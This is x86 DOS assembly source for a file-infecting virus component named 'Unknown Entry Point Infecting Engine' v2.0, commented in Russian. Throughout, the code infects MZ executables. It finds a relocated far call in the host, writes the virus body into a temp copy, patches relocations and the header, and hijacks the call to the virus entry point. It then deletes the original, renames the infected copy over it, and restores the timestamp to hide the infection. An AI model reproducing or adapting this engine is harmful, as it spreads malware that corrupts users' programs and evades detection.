
;		   Unknown Entry Point Infecting Engine
;		   ────────────────────────────────────
;			      Version 2.0

MZ_sign 	equ	0
PartPage	equ	2
PageCnt 	equ	4
RelocCnt	equ	6
HdrSize 	equ	8
StackPointer	equ	0Eh
ChekSum 	equ	12h
EntryCS 	equ	16h
TablOffs	equ	18h

LenPath 	equ	80h

;Не устанавливает идентификатор зараженности
;eax - на выходе исходное Дата/Время

;Внимание:
;	   Корректировка Reloc элементов в заголовке и в теле программы
;	   основана на предположении что адреса Reloc Элементов
;	   в Header'e линейно возрастают.Если это условие не выполняется
;	   файл будет скорректирован неправильно и будет неработоспособным

UEPinfect	proc	near
;DS = CS
;DS - Virus DATA

		mov	bx,[handle]
		mov	ah,3Fh
		mov	cx,1Ah
		mov	dx,offset Header
		call	DOS

		cmp	word ptr [Header+MZ_sign],'ZM'	;Не EXE'шник
		jne	ExitUEPInfect

		cmp	word ptr [Header+RelocCnt],0 ;Нет Reloc элементов -
		je	ExitUEPInfect		     ;нет дальних вызовов

		call	GetFPB	      ;ES:DI - File Parameter Block
				      ;Будем работать с файлом на уровне FPB

		mov	word ptr fs:[di+2],2   ;Режим открытия - Read/Write

		mov	eax,fs:[di+0Dh]   ;eax - Время/Дата
		mov	dword ptr [TimeDate],eax
		mov	edx,fs:[di+11h]   ;edx - RealLen
		mov	dword ptr [RealLen],edx

		mov	ax,word ptr [Header+PageCnt]
		cwde
		shl	eax,9	  ;Реальная длинна больше загружаемой
		cmp	eax,edx
		jc	ExitUEPInfect	  ;Скрытый Overlay

		mov	word ptr [ProgID],'ZM'

;отьедем на начало кодового сегмента
		mov	ax,word ptr [Header+EntryCS]
		movzx	eax,ax
		shl	eax,4
		call	BeginData     ;Начало Code Seg в файле
		add	eax,edx

		mov	dword ptr [CodeEntry],eax

		mov	fs:[di+15h],eax     ;Отьедем на Code Seg

		mov	ax,word ptr [Header+EntryCS] ;FileCS
		mov	bx,word ptr [Header+StackPointer]
		sub	bx,ax

		add	bx,word ptr [Header+HdrSize]   ;Место для Header'a
						       ;+ THA
		mov	ax,1000h
		cmp	ax,bx
		jnc	@temp4
		mov	bx,ax  ;BX - сколько параграфов нужно считать из файла
@temp4: 		       ;Не больше 64Кб

;Выделим память - предполагается что ее достаточно < 64Кб
		mov	ah,48h
		call	DOS
		jc	ExitUEPinfect

		mov	es,ax
;Читаем кодовый сегмент из файла
		mov	cx,bx
		sub	cx,word ptr [Header+HdrSize]
		shl	cx,4	;в байтах
		push	ds

		push	es	;DS - на выделенный блок
		pop	ds

		mov	bx,cs:[handle]
		mov	ah,3Fh
		xor	dx,dx
		call	DOS
		pop	ds
		mov	[LenCode],ax

		mov	dx,ax
		and	ax,0Fh
		pushf
		shr	dx,4
		popf
		jz	@temp7
		inc	dx
@temp7:
		mov	word ptr [ParaLenCode],dx
;Сегмент GS - для базирования THA
		mov	ax,es
		add	ax,dx
		mov	gs,ax	   ;База для Header'a


;Ищем точку входа для вируса
		mov	cx,5	   ;Искать не более 5и процедур
		mov	word ptr [StartCode],0
FindUEP:
		push	cx
		call	SearchProc   ;Ищем дальнюю процедуру
		pop	cx
		jc	FreeBlok     ;Только память зря запоганили...:-E
		push	cx
		call	SearchXref   ;Ищем на нее релокейшн
		pop	cx
		jnc	UEPisFound
		loop	FindUEP
		stc
		jmp	FreeBlok
UEPisFound:
		mov	eax,es:[di]	 ;ES:DI - адрес CALL FAR в CodeSeg
		mov	[OldReloc],eax	 ;Сохраняем настоящий адрес

		xor	di,di	       ;Сформируем путь для создания TmpFile
		call	FormTmpPath

		xor	cx,cx
		mov	ah,3Ch	      ;Создаем TempFile
		call	DOS
		push	cs
		pop	ds
		jc	FreeBlok
		mov	[TempHandle],ax

		mov	bx,ax	     ;Место для Скорректированного Header'a
		call	GetFPB
		call	BeginData
		mov	fs:[di+15h],edx

		mov	bx,[handle]
		call	GetFPB
		xor	eax,eax
		mov	fs:[di+15h],eax   ;Отьедем на начало в файле

;Читаем заголовок
		push	ds
		push	gs
		pop	ds

		call	BeginData	;Читаем уже с начала (см. выше)
		mov	cx,dx
		xor	dx,dx
		mov	ah,3Fh
		call	DOS
		pop	ds

;		call	MakeMorphVirusCopy	;Заполняет [LenDecryptor]
;		Здесь вызов какого либо Mutation Engine
;		Длинна Расшифровщика должна быть помещена в [LenDecryptor]

;Длинна вируса

		mov	ax,VirLen
		add	ax,[LenDecryptor]
		mov	dx,ax
		neg	dl
		and	dx,0Fh
		add	ax,dx	 ;AX - длинна вируса выравненная до параграфа

		mov	cx,ax

		shr	ax,4
		add	word ptr [OldReloc+2],ax
		mov	bp,ax

;Пишем вирус с DS:VirPlace
		mov	ah,40h
		mov	bx,[TempHandle]
		mov	dx,offset VirPlace
		call	DOS

;Перекопируем файл в Temp Файл попутно корректируя

		mov	si,word ptr gs:[TablOffs]
		mov	cx,word ptr gs:[RelocCnt]

		call	ReadPortion
CopyFile:
		lfs	bx,dword ptr gs:[si]
		call	TestLimit

		mov	dx,es
		mov	[AddSeg],fs
		add	dx,[AddSeg]   ;add fs,es
		mov	fs,dx

		add	fs:[bx],bp	;Настройка Элемента программы
		add	gs:[si+2],bp	;Настройка Элемента THA

		add	si,4
		dec	cx
		jne	CopyFile
;Настраиваемые элементы кончились
NextCopy:
		call	WritePortion
		call	ReadPortion	 ;ZF=1 - Конец Файла
		jnz	NextCopy

;На начало
		mov	bx,[TempHandle]
		call	GetFPB
		xor	edx,edx
		mov	fs:[di+15h],edx

;Скорректируем Адрес точки входа и Стека

		add	gs:[StackPointer],bp
		add	gs:[EntryCS],bp

;Скорректируем длинну в заголовке

		mov	dx,bp
		shl	edx,4
		add	edx,12345678h
RealLen 	equ	$-4

		mov	ax,dx
		and	ax,1FFh        ;Новая длинна в заголовке
		mov	word ptr gs:[PartPage],ax
		pushf
		shr	edx,9
		popf
		jz	@temp
		inc	dx
@temp:
		mov	word ptr gs:[PageCnt],dx

		;Идентификатор вируса
		mov	word ptr gs:[ChekSum],VrID

;Пишем Header в Temp File
		call	BeginData
		mov	cx,dx
		xor	dx,dx
		mov	ah,40h
		push	ds
		push	gs
		pop	ds
		call	DOS
		pop	ds

;отьедем на CALL FAR в скорректированном файле
		mov	edx,12345678h
CodeEntry	equ	$-4

		movzx	ebp,bp
		shl	ebp,4
		add	edx,ebp

		mov	ax,[OffsFarCall]
		movzx	eax,ax
		add	edx,eax
;Отьедем
		mov	fs:[di+15h],edx

;Точка входа
		xor	ax,ax
		push	ax
		mov	ax,VirEntryPoint
		push	ax

;Пишем нашу точку входа со стека
		mov	dx,sp
		push	ds
		push	ss
		pop	ds
		mov	cx,4
		mov	ah,40h
		call	DOS
		pop	ds
		add	sp,4

		mov	ah,3Eh	     ;Закроем Temp Файл
		call	DOS
;Закроем файл
		mov	bx,[handle]
		mov	ah,3Eh
		call	DOS

;Уничтожим файл
		mov	dx,offset Path
		mov	ah,41h
		call	DOS

;Переименуем Temp файл в заражаемый файл
		push	ds     ───────────┐
		push	es		  │
					  │
		xor	di,di		  │
		call	FormTmpPath	  │
					  │
		push	cs	       ;DS:DX - Путь Temp файла
		pop	es		  │
		mov	di,offset Path	  │
		mov	ah,56h		  │
		call	DOS		  │
					  │
		pop	es		  │
		pop	ds    ────────────┘

;Откроем заново Новый файл для последующих действий
		mov	ah,3Dh
		mov	dx,offset Path
		call	DOS

		mov	[handle],ax  ;fs:di - File Parameter Blok
		mov	bx,ax	     ;заново открытого файла
		call	GetFPB

;Восстановим Время/Дату
		mov	eax,12345678h
TimeDate	equ	$-4
		clc

FreeBlok:	push	eax
		pushf
		mov	ah,49h	     ;Освободим память
		call	DOS
		popf
		pop	eax
		ret
ExitUEPInfect:	stc
		ret
UEPinfect	endp
;──────────────────────────────────────────────────────
SearchProc	proc	near
;Поиск стандартной дальней процедуры в первых 64Кб кода
;
;  Типа:	push	bp	 ИЛИ	  enter immN,immM
;		mov	bp,sp		    .
;		 .			    .
;		 .			    .
;		 .			    .
;		pop	bp		  leave
;		retf [imm8]		  retf	imm8
;
;ES - Scanned programm code
;DS - Virus Data

		mov	dx,0FFFFh	;ID что процедура не найдена
		mov	cx,[LenCode]
		mov	[EnterProc],dx
		mov	di,[StartCode]
Scan:
		mov	al,es:[di]
		cmp	al,55h		;push BP
		je	pushBP
		cmp	al,0C8h 	;enter immN,immM
		je	EnterPRC
		cmp	al,5Dh		;pop BP
		je	exitPRC
		cmp	al,0C9h 	;leave
		je	exitPRC
NextScan:
		inc	di
		dec	cx
		jne	Scan
		stc
		retn
pushBP:
		mov	ax,es:[di+1]

		cmp	ax,0EC8Bh	;mov bp,sp
		je	EnterPRC
		cmp	ax,0E589h
		jne	NextScan
EnterPRC:
		mov	[EnterProc],di
		jmp	NextScan
exitPRC:
		cmp	[EnterProc],dx
		je	NextScan
		mov	al,es:[di+1]
		cmp	al,0CBh 	;retf
		je	OK
		cmp	al,0CAh 	;retf imm8
		je	OK
		mov	[EnterProc],dx
		jmp	NextScan
OK:		inc	di		;Для поиска следующей
		mov	[StartCode],di
		clc
		ret
SearchProc	endp
;────────────────────────────────────────────────────────────────
SearchXRef	proc	near
;Ищет Релокейшн на найденную дальнюю процедуру в первых 64Кб кода
;ES - Scanned programm code
;DS - Virus Data

		xor	di,di
		mov	cx,[LenCode]
		mov	ax,word ptr [Header+EntryCS]
		mov	dx,[EnterProc]
		mov	word ptr [OffsetPRC],dx
		mov	word ptr [OffsetPRC+2],ax
Search:
		cmp	byte ptr es:[di],9Ah
		jne	NextSearch
TestXref:
		cmp	dword ptr es:[di+1],12345678h
OffsetPRC	equ	$-4
		je	FoundFarCall		;Следующий Сегментный адрес
		inc	word ptr [OffsetPRC+2]
		sub	word ptr [OffsetPRC],10h
		jnc	TestXref

		mov	word ptr [OffsetPRC],dx
		mov	word ptr [OffsetPRC+2],ax
NextSearch:
		inc	di
		dec	cx
		jne	Search
		stc
		ret
FoundFarCall:	inc	di
		mov	[OffsFarCall],di   ; DI - адрес операнда в CALL FAR
		clc
		ret
SearchXRef	endp
;────────────────────────────────────────────
BeginData	proc
;EDX - Начало данных в файле
		mov	dx,word ptr cs:[Header+HdrSize]
		movzx	edx,dx
		shl	dx,4
		ret
BeginData	endp
;────────────────────────────────────────────
GetFPB		proc
;Возвращает в FS:DI адрес File Parameter Block
;BX - Handle
		push	bx
		push	ax
		push	es
		mov	ax,1220h	;Номер входа в SFT
		int	2Fh		;ES:[di]

		mov	bl,es:[di]	;Получим блок описания файла
		mov	ax,1216h	;es:di
		int	2Fh

		push	es
		pop	fs

		pop	es
		pop	ax
		pop	bx
		ret
GetFPB		endp
;──────────────────────────────────────────────────
FormTmpPath	proc
;Сформировать путь к Temp файлу
;На входе - куда : ES:DI
;На выходе - где : DS:DX

		push	cs
		pop	ds

		mov	si,offset Path
		push	si	───────────────────┐
		mov	word ptr [EndDir],si	   │
		mov	ax,si			   │
		inc	ax			   │
@temp5: 					   │
		cmp	byte ptr [si],'\'	   │
		jne	$+5			   │
		mov	word ptr [EndDir],ax	   │
						   │
		cmp	byte ptr [si],'/'	   │
		jne	$+5			   │
		mov	word ptr [EndDir],ax	   │
						   │
		cmp	byte ptr [si],0 	   │
		je	CopyDir 		   │
		inc	si			   │
		inc	ax			   │
		jmp	@temp5			   │
CopyDir:					   │
		pop	si   ──────────────────────┘

		push	di	    ─────────────┐
		mov	dx,offset Path ;Конец пути,после пристыкуем файл
EndDir		equ	$-2			 │
		cmp	si,dx			 │
		je	CopyName		 │
@temp2: 					 │
		lodsb				 │
		stosb				 │
		cmp	si,dx			 │
		jne	@temp2			 │
CopyName:					 │
		mov	si,offset UEPTempFile	 │
		mov	cx,LenUEPfile		 │
		cld		       ;Пристыкуем имя файла
		rep	movsb			 │
						 │
		pop	dx     ──────────────────┘
		push	es
		pop	ds
		ret
FormTmpPath	endp
;────────────────────────────────────────────────
TestLimit	proc
;Проверяет вышел ли Reloc за предел LenCode
		push	cx

		mov	dx,bx
		and	bx,0Fh
		shr	dx,4
		mov	[AddSeg],fs	;add fs,dx
		add	dx,[AddSeg]
		mov	fs,dx

		mov	cx,1
Subtract	equ	$-2
				      ────────────┐
Repeat: 	mov	[AddSeg],fs		  │
		sub	[AddSeg],1234h	     ;sub fs,ParaLenCode
ParaLenCode	equ	$-2			  │
		jc	Restore 		  │
		mov	fs,[AddSeg]		  │
						  │
		loop	Repeat	      ────────────┘

		call	WritePortion
		call	ReadPortion

		inc	word ptr [Subtract]
		mov	cx,1
		jmp	Repeat

Restore:	pop	cx
		ret
TestLimit	endp
;─────────────────────────────────
ReadPortion	proc

		push	cx
		push	bx
		push	ax

		mov	ah,3Fh
		mov	bx,[Handle]
		mov	cx,[LenCode]
		xor	dx,dx
		push	ds
		push	es
		pop	ds
		call	DOS
		pop	ds
		mov	word ptr [WrLen],ax
		cmp	ax,0
		pop	ax
		pop	bx
		pop	cx
		ret
ReadPortion	endp
;─────────────────────────────────
WritePortion	proc

		push	cx
		push	bx
		push	ax

		mov	ah,40h
		mov	bx,[TempHandle]
		mov	cx,0000h
WrLen		equ	$-2
		xor	dx,dx
		push	ds
		push	es
		pop	ds
		call	DOS
		pop	ds

		pop	ax
		pop	bx
		pop	cx
		ret
WritePortion	endp
;─────────────── UEP Engine DATA ─────────────────
UEPTempFile	db	'uepfile.tmp',0
LenUEPfile	equ	$-UEPTempFile
StartCode	dw	0
LenCode 	dw	0
EnterProc	dw	0
OffsFarCall	dw	0
TempHandle	dw	0
ProgID		dw	'MZ'
AddSeg		dw	0
OldReloc	dd	0
;─────────────────────────────────────────────────
